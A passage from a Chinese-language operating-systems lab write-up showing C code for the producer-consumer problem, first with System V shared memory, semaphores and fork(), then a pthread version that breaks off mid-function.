class="comment">unsigned short *array;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"><span class="comment">union semun su;//sem union，用于初始化信号量</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> head;</span><br><span class="line"><span class="keyword">int</span> tail;</span><br><span class="line"><span class="keyword">char</span> str[MAX_BUFFER_SIZE];</span><br><span class="line"><span class="keyword">int</span> num;  <span class="comment">//缓冲区里字母数量</span></span><br><span class="line"><span class="keyword">int</span> is_empty;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N_CONSUMER = <span class="number">2</span>;<span class="comment">//消费者数量</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N_PRODUCER = <span class="number">2</span>;<span class="comment">//生产者数量</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N_BUFFER = <span class="number">10</span>;<span class="comment">//缓冲区容量</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N_WORKTIME = <span class="number">10</span>;<span class="comment">//工作次数</span></span><br><span class="line"><span class="keyword">int</span> shm_id = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> sem_id = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">pid_t</span> child;</span><br><span class="line"><span class="keyword">pid_t</span> parent;</span><br><span class="line"></span><br><span class="line"><span class="comment">//得到10以内的一个随机数  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_random</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> digit;  </span><br><span class="line">    srand((<span class="keyword">unsigned</span>)(getpid() + time(<span class="literal">NULL</span>)));  </span><br><span class="line">    digit = rand() % <span class="number">10</span>;  </span><br><span class="line">    <span class="keyword">return</span> digit;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//得到A～Z的一个随机字母  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">getRandChar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> letter;  </span><br><span class="line">    srand((<span class="keyword">unsigned</span>)(getpid() + time(<span class="literal">NULL</span>)));  </span><br><span class="line">    letter = (<span class="keyword">char</span>)((rand() % <span class="number">26</span>) + <span class="string">'A'</span>);  </span><br><span class="line">    <span class="keyword">return</span> letter;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//sem_id 表示信号量集合的 id</span></span><br><span class="line"><span class="comment">//sem_num 表示要处理的信号量在信号量集合中的索引</span></span><br><span class="line"><span class="comment">//P操作</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitSem</span><span class="params">(<span class="keyword">int</span> sem_id,<span class="keyword">int</span> sem_num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span> <span class="title">sb</span>;</span></span><br><span class="line">sb.sem_num = sem_num;</span><br><span class="line">sb.sem_op = <span class="number">-1</span>;<span class="comment">//表示要把信号量减一</span></span><br><span class="line">sb.sem_flg = SEM_UNDO;<span class="comment">//</span></span><br><span class="line"><span class="comment">//第二个参数是 sembuf [] 类型的，表示数组</span></span><br><span class="line"><span class="comment">//第三个参数表示 第二个参数代表的数组的大小</span></span><br><span class="line"><span class="keyword">if</span>(semop(sem_id,&amp;sb,<span class="number">1</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"waitSem failed"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//V操作</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigSem</span><span class="params">(<span class="keyword">int</span> sem_id,<span class="keyword">int</span> sem_num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span> <span class="title">sb</span>;</span></span><br><span class="line">sb.sem_num = sem_num;</span><br><span class="line">sb.sem_op = <span class="number">1</span>;</span><br><span class="line">sb.sem_flg = SEM_UNDO;</span><br><span class="line"><span class="comment">//第二个参数是 sembuf [] 类型的，表示数组</span></span><br><span class="line"><span class="comment">//第三个参数表示 第二个参数代表的数组的大小</span></span><br><span class="line"><span class="keyword">if</span>(semop(sem_id,&amp;sb,<span class="number">1</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"sigSem failed"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印进程运行结果</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printTime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//打印时间</span></span><br><span class="line"><span class="keyword">time_t</span> now;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">timenow</span>;</span>         <span class="comment">//实例化tm结构指针</span></span><br><span class="line">time(&amp;now);</span><br><span class="line">timenow = localtime(&amp;now);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"执行时间： %s "</span>,asctime(timenow));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">shm_id = shmget(IPC_PRIVATE,MAX_BUFFER_SIZE,SHM_MODE);   <span class="comment">//申请共享内存</span></span><br><span class="line"><span class="keyword">if</span>(shm_id &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">"create shared memory failed"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_buffer</span> *<span class="title">shmptr</span>;</span>  </span><br><span class="line">shmptr = shmat(shm_id, <span class="number">0</span>, <span class="number">0</span>);   <span class="comment">//将申请的共享内存附加到申请通信的进程空间</span></span><br><span class="line"><span class="keyword">if</span> (shmptr == (<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">&#123;  </span><br><span class="line">        perror(<span class="string">"add buffer to using process space failed！\n"</span>);  </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((sem_id = semget(IPC_PRIVATE,<span class="number">3</span>,SEM_MODE)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;                  <span class="comment">//创建三个信号量，SEM_EMPTY,SEM_FULL和MUTEX</span></span><br><span class="line">perror(<span class="string">"create semaphore failed! \n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(semctl(sem_id,SEM_FULL,SETVAL,<span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">&#123;<span class="comment">//将索引为0的信号量设置为0--&gt;SEM_FULL</span></span><br><span class="line">perror(<span class="string">"sem set value error! \n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(semctl(sem_id,SEM_EMPTY,SETVAL,<span class="number">10</span>) == <span class="number">-1</span>)</span><br><span class="line">&#123;<span class="comment">//将索引为1的信号量设置为10--&gt;SEM_EMPTY</span></span><br><span class="line"> perror(<span class="string">"sem set value error! \n"</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(semctl(sem_id,MUTEX,SETVAL,<span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">&#123;<span class="comment">//将索引为3的信号量设置为1--&gt;MUTEX</span></span><br><span class="line"> perror(<span class="string">"sem set value error! \n"</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shmptr -&gt; head = <span class="number">0</span>;  </span><br><span class="line">    shmptr -&gt; tail = <span class="number">0</span>;  </span><br><span class="line">    shmptr -&gt; is_empty = <span class="number">1</span>;  </span><br><span class="line">    shmptr -&gt; num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N_PRODUCER; i++)</span><br><span class="line">&#123;</span><br><span class="line">parent = fork();</span><br><span class="line"><span class="keyword">if</span>(parent &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">"the fork failed"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(parent == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">shmptr = shmat(shm_id, <span class="number">0</span>, <span class="number">0</span>);   <span class="comment">//将申请的共享内存附加到申请通信的进程空间</span></span><br><span class="line"><span class="keyword">if</span> (shmptr == (<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">&#123;  </span><br><span class="line">        perror(<span class="string">"add buffer to using process space failed！\n"</span>);  </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N_WORKTIME; j++)</span><br><span class="line">&#123;</span><br><span class="line">waitSem(sem_id, SEM_EMPTY);</span><br><span class="line">waitSem(sem_id, MUTEX);</span><br><span class="line">sleep(get_random()); </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-------------------------------------------------------------\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"我是第 %d 个生产者进程，PID = %d\n"</span>, i + <span class="number">1</span>, getpid());</span><br><span class="line"></span><br><span class="line"><span class="comment">/*生产产品*/</span></span><br><span class="line"><span class="keyword">char</span> c = getRandChar();                                      <span class="comment">//随机获取字母</span></span><br><span class="line">shmptr -&gt; str[shmptr-&gt;tail] = c;</span><br><span class="line">                shmptr -&gt; tail = (shmptr-&gt;tail + <span class="number">1</span>) % MAX_BUFFER_SIZE;  </span><br><span class="line">                shmptr -&gt; is_empty = <span class="number">0</span>;           <span class="comment">//写入新产品  </span></span><br><span class="line">shmptr -&gt; num++;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*打印输出结果*/</span></span><br><span class="line">printTime();              <span class="comment">//程序运行时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"缓冲区数据（%d个）："</span>,shmptr -&gt; num);                   <span class="comment">//打印缓冲区中的数据</span></span><br><span class="line">p = (shmptr-&gt;tail<span class="number">-1</span> &gt;= shmptr-&gt;head) ? (shmptr-&gt;tail<span class="number">-1</span>) : (shmptr-&gt;tail<span class="number">-1</span> + MAX_BUFFER_SIZE);  </span><br><span class="line">                <span class="keyword">for</span> (p; !(shmptr -&gt; is_empty) &amp;&amp; p &gt;= shmptr -&gt; head; p--)  </span><br><span class="line">                &#123;  </span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%c"</span>, shmptr -&gt; str[p % MAX_BUFFER_SIZE]);  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\t 生产者 %d  放入 '%c'. \n"</span>, i + <span class="number">1</span>, c);  </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-------------------------------------------------------------\n"</span>);</span><br><span class="line"></span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">sigSem(sem_id, MUTEX);</span><br><span class="line">sigSem(sem_id, SEM_FULL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将共享段与进程之间解除连接  </span></span><br><span class="line">            shmdt(shmptr);  </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N_CONSUMER; i++)</span><br><span class="line">&#123;</span><br><span class="line">child = fork();</span><br><span class="line"><span class="keyword">if</span>(child &lt; <span class="number">0</span>)<span class="comment">//调用fork失败</span></span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">"the fork failed"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(child == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>; </span><br><span class="line">shmptr = shmat(shm_id, <span class="number">0</span>, <span class="number">0</span>);   <span class="comment">//将申请的共享内存附加到申请通信的进程空间</span></span><br><span class="line"><span class="keyword">if</span> (shmptr == (<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">&#123;  </span><br><span class="line">        perror(<span class="string">"add buffer to using process space failed！\n"</span>);  </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);  </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N_WORKTIME; j++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">waitSem(sem_id, SEM_FULL);</span><br><span class="line">waitSem(sem_id, MUTEX);</span><br><span class="line">sleep(get_random()); </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-------------------------------------------------------------\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"我是第 %d 个消费者进程，PID = %d\n"</span>, i + <span class="number">1</span>, getpid());</span><br><span class="line"><span class="comment">/*消费数据*/</span></span><br><span class="line"><span class="keyword">char</span> lt = shmptr -&gt; str[shmptr -&gt; head];  </span><br><span class="line">                shmptr -&gt; head = (shmptr -&gt; head + <span class="number">1</span>) % MAX_BUFFER_SIZE;  </span><br><span class="line">                shmptr -&gt; is_empty = (shmptr-&gt;head == shmptr-&gt;tail);  <span class="comment">//</span></span><br><span class="line">shmptr -&gt; num--;</span><br><span class="line"><span class="comment">/*打印输出结果*/</span></span><br><span class="line">printTime(); <span class="comment">//程序运行时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"缓冲区数据（%d个）："</span>,shmptr -&gt; num);                   <span class="comment">//打印缓冲区中的数据</span></span><br><span class="line">p = (shmptr -&gt; tail - <span class="number">1</span> &gt;= shmptr -&gt; head) ? (shmptr -&gt; tail<span class="number">-1</span>) : (shmptr -&gt; tail - <span class="number">1</span> + MAX_BUFFER_SIZE);  </span><br><span class="line">                <span class="keyword">for</span> (p; !(shmptr -&gt; is_empty) &amp;&amp; p &gt;= shmptr -&gt; head; p--)  </span><br><span class="line">                &#123;  </span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%c"</span>, shmptr -&gt; str[p % MAX_BUFFER_SIZE]);  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\t 消费者 %d  取出 '%c'. \n"</span>, i + <span class="number">1</span>, lt);  </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-------------------------------------------------------------\n"</span>);</span><br><span class="line"></span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">sigSem(sem_id,MUTEX);</span><br><span class="line">sigSem(sem_id,SEM_EMPTY);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将共享段与进程之间解除连接  </span></span><br><span class="line">        shmdt(shmptr);  </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//主进程最后退出  </span></span><br><span class="line">    <span class="keyword">while</span> (wait(<span class="number">0</span>) != <span class="number">-1</span>);  </span><br><span class="line">    <span class="comment">//将共享段与进程之间解除连接  </span></span><br><span class="line">    shmdt(shmptr);  </span><br><span class="line">    <span class="comment">//对共享内存区执行控制操作  </span></span><br><span class="line">    shmctl(shm_id,IPC_RMID,<span class="number">0</span>);<span class="comment">//当cmd为IPC_RMID时，删除该共享段  </span></span><br><span class="line">    shmctl(sem_id,IPC_RMID,<span class="number">0</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"主进程运行结束！\n"</span>);  </span><br><span class="line">    fflush(<span class="built_in">stdout</span>);  </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="七、利用多线程实现本实验"><a href="#七、利用多线程实现本实验" class="headerlink" title="七、利用多线程实现本实验"></a>七、利用多线程实现本实验</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">/*信号量*/</span></span><br><span class="line"><span class="comment">//空的信号量和满的信号量</span></span><br><span class="line"><span class="keyword">sem_t</span> empty_sem, full_sem;   </span><br><span class="line"><span class="comment">//静态创建条件变量</span></span><br><span class="line"><span class="keyword">pthread_cond_t</span> full = PTHREAD_COND_INITIALIZER;        <span class="comment">//满的变量</span></span><br><span class="line"><span class="keyword">pthread_cond_t</span> empty = PTHREAD_COND_INITIALIZER;       <span class="comment">//空的变量</span></span><br><span class="line"><span class="keyword">pthread_mutex_t</span> lock = PTHREAD_MUTEX_INITIALIZER;      <span class="comment">//互斥锁</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFERNUM 10    </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//缓冲区队列</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Buffer_Queue</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> production[BUFFERNUM];  <span class="comment">//产品</span></span><br><span class="line"><span class="keyword">int</span> front, rear;             <span class="comment">//头指针和尾指针</span></span><br><span class="line"><span class="keyword">int</span> num;                     <span class="comment">//缓冲区里面字母数量        </span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出设计者信息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printDesign</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"   ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"   ┃            生产者-消费者问题实现                 ┃\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"   ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//随机产生生产字符</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">getRandChar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> temp = rand()%<span class="number">26</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">'a'</span>+temp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印进程运行结果</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printTime</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//打印时间</span></span><br><span class="line"><span class="keyword">time_t</span> now;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">timenow</span>;</span>         <span class="comment">//实例化tm结构指针</span></span><br><span class="line">time(&amp;now);</span><br><span class="line">timenow = localtime(&amp;now);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"执行时间： %s "</span>,asctime(timenow));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生产者1</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">producer1</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Buffer_Queue</span> *<span class="title">q</span>;</span></span><br><span class="line">q = (struct Buffer_Queue *) arg;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">pthread_mutex_lock(&amp;lock);       </span><br><span class="line"><span class="keyword">while</span> (q-&gt;num == BUFFERNUM)    <span class="comment">//缓冲区已经满了，等待</span></span><br><span class="line">&#123;            </span><br><span class="line">pthread_cond_wait(&amp;full, &amp;lock);</span><br><span class="line">&#125;</span><br><span class="line">sem_wait(&amp;empty_sem);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*生产产品*/</span></span><br><span class="line"><span class="keyword">char</span> c = getRandChar();                                      <span class="comment">//随机获取字母</span></span><br><span class="line">q-&gt;rear = (q-&gt;rear + <span class="number">1</span>) % BUFFERNUM;                         <span class="comment">//计算新的尾指针   </span></span><br><span class="line">q-&gt;production[q-&gt;rear] = c;                                  <span class="comment">//写入新产品</span></span><br><span class="line">q-&gt;num++;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*打印输出结果*/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-------------------------------------------------------------\n"</span>);</span><br><span class="line">printTime();              <span class="comment">//程序运行时间</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"缓冲区数据（%d个）："</span>,q-&gt;num);                  <span class="comment">//打印缓冲区中的数据</span></span><br><span class="line"><span class="keyword">if</span>(q-&gt;front &lt; q-&gt;rear)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = q-&gt;front; i &lt;= q-&gt;rear; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c 